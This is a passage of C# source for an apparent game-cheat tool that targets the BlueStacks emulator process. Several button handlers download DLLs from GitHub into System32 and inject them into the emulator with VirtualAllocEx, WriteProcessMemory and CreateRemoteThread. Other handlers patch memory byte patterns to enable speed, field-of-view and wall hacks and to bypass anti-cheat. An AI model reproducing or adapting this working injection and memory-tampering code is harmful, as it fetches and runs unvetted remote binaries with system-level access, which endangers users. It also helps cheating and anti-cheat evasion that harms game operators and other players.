            CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
        }

        private void guna2Button18_Click(object sender, EventArgs e)
        {
            string fileName = "C:\\Windows\\System32\\NEAchams.dll";
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            string adress = "https://github.com/khawarahemad/Charms-DLL/raw/main/NEAchams.dll";
            bool flag = File.Exists(fileName);
            if (flag)
            {
                File.Delete(fileName);
            }
            this.webclient.DownloadFile(adress, fileName);
            Process targetProcess = Process.GetProcessesByName("HD-Player")[0];
            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            string dllName = "NEAchams.dll";
            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            UIntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
            CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
        }

        private void guna2Button19_Click(object sender, EventArgs e)
        {
            string fileName = "C:\\Windows\\System32\\moco.ll.dll";
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            string adress = "https://github.com/khawarahemad/Charms-DLL/raw/main/moco.ll.dll";
            bool flag = File.Exists(fileName);
            if (flag)
            {
                File.Delete(fileName);
            }
            this.webclient.DownloadFile(adress, fileName);
            Process targetProcess = Process.GetProcessesByName("HD-Player")[0];
            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            string dllName = "moco.ll.dll";
            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            UIntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
            CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
        }

        private void guna2Button20_Click(object sender, EventArgs e)
        {
            string fileName = "C:\\Windows\\System32\\Red_Antena.dll";
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            string adress = "https://github.com/khawarahemad/Charms-DLL/raw/main/Red_Antena.dll";
            bool flag = File.Exists(fileName);
            if (flag)
            {
                File.Delete(fileName);
            }
            this.webclient.DownloadFile(adress, fileName);
            Process targetProcess = Process.GetProcessesByName("HD-Player")[0];
            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            string dllName = "Red_Antena.dll";
            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            UIntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
            CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
        }

        private void guna2Button21_Click(object sender, EventArgs e)
        {
            string fileName = "C:\\Windows\\System32\\Red%20Num.dll";
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            string adress = "https://github.com/khawarahemad/Injecter/raw/main/Red%20Num.dll";
            bool flag = File.Exists(fileName);
            if (flag)
            {
                File.Delete(fileName);
            }
            this.webclient.DownloadFile(adress, fileName);
            Process targetProcess = Process.GetProcessesByName("HD-Player")[0];
            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            string dllName = "Red%20Num.dll";
            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            UIntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
            CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
        }

        private async void guna2Button22_Click(object sender, EventArgs e)
        {
            List<string> searchList = new List<string>
{

              "00 00 20 42 00 00 40 40 00 00 70 42 00 00 00 00 00 00 C0 3F 0A D7 A3 3B 0A D7 A3 3B 8F C2 75 3D AE 47 E1 3D 9A 99 19 3E CD CC 4C 3E A4 70 FD 3E",
};

            List<string> replaceList = new List<string>
{
              "00 00 20 42 00 00 FE FF 00 00 70 42 00 00 00 00 00 00 C0 3F 0A D7 A3 3B 0A D7 A3 3B 8F C2 75 3D AE 47 E1 3D 9A 99 19 3E CD CC 4C 3E A4 70 FD 3E",
};

            bool k = false;

            if (Process.GetProcessesByName("HD-Player").Length == 0)
            {
                status.Text = "Open Emulator";
            }
            else
            {
                sasuke.OpenProcess("HD-Player");
                status.Text = "Activating ...";

                int i2 = 22000000;

                for (int j = 0; j < searchList.Count; j++)
                {
                    IEnumerable<long> cu = await sasuke.AoBScan(searchList[j], writable: true);
                    string u = "0x" + cu.FirstOrDefault().ToString("X");

                    if (cu.Count() != 0)
                    {
                        for (int i = 0; i < cu.Count(); i++)
                        {
                            i2++;
                            sasuke.WriteMemory(cu.ElementAt(i).ToString("X"), "bytes", replaceList[j]);
                        }
                        k = true;
                    }
                }

                if (k == true)
                {
                    status.Text = "FOV ACTIVATED ✔";
                }
                else
                {
                    status.Text = "Failed";
                }
            }
        }


        private void guna2ToggleSwitch2_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void label5_Click_1(object sender, EventArgs e)
        {

        }

        private void label15_Click(object sender, EventArgs e)
        {

        }

        private async void guna2Button4_Click_2(object sender, EventArgs e)
        {
            List<string> searchList = new List<string>
{

              "C0 3F 33 33 13 40 00 00 F0 3F 00 00 80 3F 01 00 00 00 00 00 00 00 ?? ?? ?? ?? 00 00 00 00 FF FF FF FF",
};

            List<string> replaceList = new List<string>
{
              "C0 3F 33 33 EF FF 00 00 F0 3F 00 00 80 3F 01 00 00 00 00 00 00 00 E0 A2 93 8A 00 00 00 00 FF FF FF FF",
};

            bool k = false;

            if (Process.GetProcessesByName("HD-Player").Length == 0)
            {
                status.Text = "Open Emulator";
            }
            else
            {
                sasuke.OpenProcess("HD-Player");
                status.Text = "Activating ...";

                int i2 = 22000000;

                for (int j = 0; j < searchList.Count; j++)
                {
                    IEnumerable<long> cu = await sasuke.AoBScan(searchList[j], writable: true);
                    string u = "0x" + cu.FirstOrDefault().ToString("X");

                    if (cu.Count() != 0)
                    {
                        for (int i = 0; i < cu.Count(); i++)
                        {
                            i2++;
                            sasuke.WriteMemory(cu.ElementAt(i).ToString("X"), "bytes", replaceList[j]);
                        }
                        k = true;
                    }
                }

                if (k == true)
                {
                    status.Text = "FOV 2X ACTIVATED ✔";
                }
                else
                {
                    status.Text = "Failed";
                }
            }
        }

        private void label9_Click(object sender, EventArgs e)
        {

        }

        private async void guna2Button23_Click(object sender, EventArgs e)
        {
            List<string> searchList = new List<string>
{

              "C5 27 37 30 48 2D E9 01 40 A0 E1 20 10 9F E5 00 50",
};

            List<string> replaceList = new List<string>
{
              "C5 27 3F 30 50 2D E9 01 48 A8 E1 20 10 9F E5 00 50",
};

            bool k = false;

            if (Process.GetProcessesByName("HD-Player").Length == 0)
            {
                status.Text = "Open Emulator";
            }
            else
            {
                sasuke.OpenProcess("HD-Player");
                status.Text = "Activating ...";

                int i2 = 22000000;

                for (int j = 0; j < searchList.Count; j++)
                {
                    IEnumerable<long> cu = await sasuke.AoBScan(searchList[j], writable: true);
                    string u = "0x" + cu.FirstOrDefault().ToString("X");

                    if (cu.Count() != 0)
                    {
                        for (int i = 0; i < cu.Count(); i++)
                        {
                            i2++;
                            sasuke.WriteMemory(cu.ElementAt(i).ToString("X"), "bytes", replaceList[j]);
                        }
                        k = true;
                    }
                }

                if (k == true)
                {
                    status.Text = "MAGIC ACTIVATED ✔";
                }
                else
                {
                    status.Text = "Failed";
                }

            }
        }

        

        private async void guna2Button25_Click(object sender, EventArgs e)
        {
            List<string> searchList = new List<string>
{

              "99 10 A0 E3 66 00 00 EB 00 0A B7 EE 10 0A 01 EE 00 0A 31 EE 10 5A 01 EE 00 0A 21 EE 10 0A 10 EE",
};

            List<string> replaceList = new List<string>
{
              "99 10 A0 E3 D6 00 00 EB 00 0A B7 EE 10 0A 01 EE 00 0A 31 EE 10 5A 01 EE 00 0A 21 EE 10 0A 10 EE",
};

            bool k = false;

            if (Process.GetProcessesByName("HD-Player").Length == 0)
            {
                status.Text = "Open Emulator";
            }
            else
            {
                sasuke.OpenProcess("HD-Player");
                status.Text = "Activating ...";

                int i2 = 22000000;

                for (int j = 0; j < searchList.Count; j++)
                {
                    IEnumerable<long> cu = await sasuke.AoBScan(searchList[j], writable: true);
                    string u = "0x" + cu.FirstOrDefault().ToString("X");

                    if (cu.Count() != 0)
                    {
                        for (int i = 0; i < cu.Count(); i++)
                        {
                            i2++;
                            sasuke.WriteMemory(cu.ElementAt(i).ToString("X"), "bytes", replaceList[j]);
                        }
                        k = true;
                    }
                }

                if (k == true)
                {
                    status.Text = "Reload Activated ✔";
                }
                else
                {
                    status.Text = "Failed";
                }

            }
        }
        
        private void tabPage1_Click(object sender, EventArgs e)
        {

        }

        // Global Variables
        private List<long> scanResultsSpeed = new List<long>();  // To hold memory addresses
        private const string ProcessName = "HD-Player";           // Process name

        List<string> searchList = new List<string>
{
    "01 00 00 00 02 2B 07 3D",
};

        List<string> replaceList = new List<string>
{
    "01 00 00 00 92 E4 6F 3D",
};

        private bool isScanned = false;  // Flag to indicate if a scan was performed

        // ScanMemory Method to scan once and store results
        private async Task<bool> ScanMemory()
        {
            if (Process.GetProcessesByName(ProcessName).Length == 0)
            {
                status.Text = "Open Emulator";
                return false;  // Return false if the process is not found
            }

            sasuke.OpenProcess(ProcessName);  // Open the target process
            status.Text = "Scanning...";

            scanResultsSpeed.Clear();  // Clear previous results

            // Iterate through search patterns and scan memory
            foreach (var searchPattern in searchList)
            {
                IEnumerable<long> results = await sasuke.AoBScan(searchPattern, writable: true);

                if (!results.Any())
                {
                    status.Text = "Pattern not found!";
                    continue;
                }

                scanResultsSpeed.AddRange(results);  // Store all found memory addresses
            }

            isScanned = scanResultsSpeed.Count > 0;  // Set flag if scan is successful

            status.Text = isScanned ? "Scan Completed ✔" : "No matches found.";
            return isScanned;  // Return the status of the scan
        }

        // Button Click Handlers

        // Scan Button (guna2Button26_Click)
        private async void guna2Button26_Click(object sender, EventArgs e)
        {
            await ScanMemory();  // Call the ScanMemory method
        }

        // Enable Button (guna2Button27_Click)
        private void guna2Button27_Click(object sender, EventArgs e)
        {
            if (!isScanned || scanResultsSpeed.Count == 0)
            {
                status.Text = "No scan results available!";
                return;
            }

            try
            {
                foreach (var address in scanResultsSpeed)
                {
                    sasuke.WriteMemory(address.ToString("X"), "bytes", replaceList[0]);
                }
                status.Text = "SPEED ON ✔";
            }
            catch (Exception ex)
            {
                status.Text = $"Error during write: {ex.Message}";
            }
        }

        // Disable Button (guna2Button28_Click)
        private void guna2Button28_Click(object sender, EventArgs e)
        {
            if (!isScanned || scanResultsSpeed.Count == 0)
            {
                status.Text = "No scan results available!";
                return;
            }

            try
            {
                foreach (var address in scanResultsSpeed)
                {
                    sasuke.WriteMemory(address.ToString("X"), "bytes", searchList[0]);
                }
                status.Text = "SPEED OFF ✔";
            }
            catch (Exception ex)
            {
                status.Text = $"Error during restore: {ex.Message}";
            }
        }
        
            private async void guna2Button2400_Click(object sender, EventArgs e)
        {
            // Two sets of search and replace AoB codes
            List<string> searchList = new List<string>
    {
        "code 1",
        "code 2"
    };

            List<string> replaceList = new List<string>
    {
        "code 1",
        "code 2"
    };

            bool isSuccessful = false;

            try
            {
                // Check if the process is running
                if (Process.GetProcessesByName("HD-Player").Length == 0)
                {
                    status.Text = "Open Emulator";
                    return;
                }

                // Open the target process
                sasuke.OpenProcess("HD-Player");
                status.Text = "Activating ...";

                // Loop through search and replace patterns
                for (int j = 0; j < searchList.Count; j++)
                {
                    // Perform the AoB scan for the current search pattern
                    IEnumerable<long> scanResults = await sasuke.AoBScan(searchList[j], writable: true);

                    // Check if any results were found
                    if (scanResults.Any())
                    {
                        foreach (long address in scanResults)
                        {
                            try
                            {
                                // Sanitize the replacement AoB to remove any invalid characters
                                string sanitizedReplaceData = SanitizeHexString(replaceList[j]);

                                // Write the sanitized replacement AoB to memory
                                string hexAddress = address.ToString("X");
                                sasuke.WriteMemory(hexAddress, "bytes", sanitizedReplaceData);
                                status.Text = $"Writing data to address"; // Feedback for each write
                            }
                            catch (Exception ex)
                            {
                                // Handle memory write error and log detailed message
                                status.Text = $"Error writing memory";
                                return;
                            }
                        }
                        isSuccessful = true;
                    }
                    else
                    {
                        status.Text = $"not found.";
                    }
                }

                // Update status based on the success of the operation
                if (isSuccessful)
                {
                    status.Text = "Activated ✔";
                }
                else
                {
                    status.Text = "Failed to activate.";
                }
            }
            catch (Exception ex)
            {
                // Handle any other exceptions
                status.Text = "Error: " + ex.Message;
            }
        }

        // Helper function to sanitize the hex string
        private string SanitizeHexString(string hexString)
        {
            // Remove any invalid characters and ensure only hex digits and spaces remain
            return string.Concat(hexString.Where(c => "0123456789ABCDEFabcdef ".Contains(c))).ToUpper();
        }
        

        private async void guna2Button31_Click(object sender, EventArgs e)
        {
            List<string> searchList = new List<string>
{

              "90 8D E5 28 90 8D E5 24 90 8D E5 20 90 8D E5 1C 90 8D E5 18 90 8D E5 10 90 8D E5 08 60 8D E5 82 00 8D E8 10 17 02 E3 3C FF 2F E1 DC A0 94 E5 00 00 5A E3 0F 00 00 1A 00 00 58 E3 01 00 00 1A 00",
};

            List<string> replaceList = new List<string>
{
              "90 8D E5 28 90 8D E5 24 90 8D E5 20 90 8D E5 1C 90 8D E5 18 90 8D E5 10 90 8D E5 08 60 8D E5 82 00 8D AE 90 17 44 3F EF F0 3F E1 DC A0 94 E5 00 00 5A E3 0F 00 00 1A 00 00 58 E3 01 00 00 1A 00",
};

            bool k = false;

            if (Process.GetProcessesByName("HD-Player").Length == 0)
            {
                status.Text = "Open Emulator";
            }
            else
            {
                sasuke.OpenProcess("HD-Player");
                status.Text = "Activating ...";

                int i2 = 22000000;

                for (int j = 0; j < searchList.Count; j++)
                {
                    IEnumerable<long> cu = await sasuke.AoBScan(searchList[j], writable: true);
                    string u = "0x" + cu.FirstOrDefault().ToString("X");

                    if (cu.Count() != 0)
                    {
                        for (int i = 0; i < cu.Count(); i++)
                        {
                            i2++;
                            sasuke.WriteMemory(cu.ElementAt(i).ToString("X"), "bytes", replaceList[j]);
                        }
                        k = true;
                    }
                }

                if (k == true)
                {
                    status.Text = "Wall Anticheat ✔";
                }
                else
                {
                    status.Text = "Failed";
                }

            }
            
        }
        private List<long> scanResultsWall = new List<long>();  // To hold memory addresses


        List<string> searchListWall = new List<string>
{
    "81 3F AE 47 81 3F AE 47 81 3F AE 47 81 3F 00 1A B7 EE DC 3A 9F ED 30 00 4F E2 43 2A B0 EE EF 0A 60 F4 43 6A",
};

        List<string> replaceListWall = new List<string>
{
    "81 C1 AE 47 81 3F AE 47 3C C0 AE 47 81 3F 00 1A B7 EE DC 3A 9F ED 30 00 4F E2 43 2A B0 EE EF 0A 60 F4 43 6A",
};

        private bool isScannedWall = false;  // Flag to indicate if a scan was performed

        // ScanMemoryWall Method to scan once and store results
        private async Task<bool> ScanMemoryWall()
        {
            if (Process.GetProcessesByName(ProcessName).Length == 0)
            {
                status.Text = "Open Emulator";
                return false;  // Return false if the process is not found
            }

            sasuke.OpenProcess(ProcessName);  // Open the target process
            status.Text = "Scanning...";

            scanResultsWall.Clear();  // Clear previous results

            // Iterate through search patterns and scan memory
            foreach (var searchPattern in searchListWall)
            {
                IEnumerable<long> results = await sasuke.AoBScan(searchPattern, writable: true);

                if (!results.Any())
                {
                    status.Text = "Pattern not found!";
                    continue;
                }

                scanResultsWall.AddRange(results);  // Store all found memory addresses
            }

            isScannedWall = scanResultsWall.Count > 0;  // Set flag if scan is successful

            status.Text = isScannedWall ? "Scan Completed ✔" : "No matches found.";
            return isScannedWall;  // Return the status of the scan
        }

        // Button Click Handlers

        // Scan Button (guna2Button26_Click)
        private async void guna2Button24_Click(object sender, EventArgs e)
        {
            await ScanMemoryWall();  // Call the ScanMemoryWall method
        }

        // Enable Button (guna2Button27_Click)
        private void guna2Button29_Click(object sender, EventArgs e)
        {
            if (!isScannedWall || scanResultsWall.Count == 0)
            {
                status.Text = "No scan results available!";
                return;
            }

            try
            {
                foreach (var address in scanResultsWall)
                {
                    sasuke.WriteMemory(address.ToString("X"), "bytes", replaceListWall[0]);
                }
                status.Text = "Wall ON ✔";
            }
            catch (Exception ex)
            {
                status.Text = $"Error during write: {ex.Message}";
            }
        }

        // Disable Button (guna2Button28_Click)
        private void guna2Button30_Click(object sender, EventArgs e)
        {
            if (!isScannedWall || scanResultsWall.Count == 0)
            {
                status.Text = "No scan results available!";
                return;
            }

            try
            {
                foreach (var address in scanResultsWall)
                {
                    sasuke.WriteMemory(address.ToString("X"), "bytes", searchListWall[0]);
                }
                status.Text = "Wall OFF ✔";
            }
            catch (Exception ex)
            {
                status.Text = $"Error during restore: {ex.Message}";
            }
        }
    }
}
    
